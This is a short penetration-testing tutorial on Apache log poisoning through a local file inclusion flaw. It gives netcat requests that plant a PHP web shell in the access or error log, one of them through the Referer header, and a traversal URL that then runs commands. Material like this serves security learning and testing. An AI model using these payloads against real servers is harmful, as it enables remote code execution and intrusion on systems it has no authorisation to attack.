### Log poisoning

There are some requirements. We need to be able to read log files. In this example we are going to poison the apache log file. You can use either the success.log or the error.log

So once you have found a LFI vuln you have to inject php-code into the log file and then execute it.

**Insert php-code into the log file**

This can be done with nc or telnet.

```
nc 192.168.1.102 80
GET /<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

You can also add it to the error-log by making a request to a page that doesn't exists

```
nc 192.168.1.102 80
GET /AAAAAA<?php passthru($_GET['cmd']); ?> HTTP/1.1
Host: 192.168.1.102
Connection: close
```

Or in the referer parameter.

```
GET / HTTP/1.1
Referer: <? passthru($_GET[cmd]) ?>
Host: 192.168.1.159
Connection: close
```

**Execute it in the browser**

Now you can request the log-file through the LFI and see the php-code get executed.

```
http://192.168.1.102/index.php?page=../../../../../var/log/apache2/access.log&cmd=id
```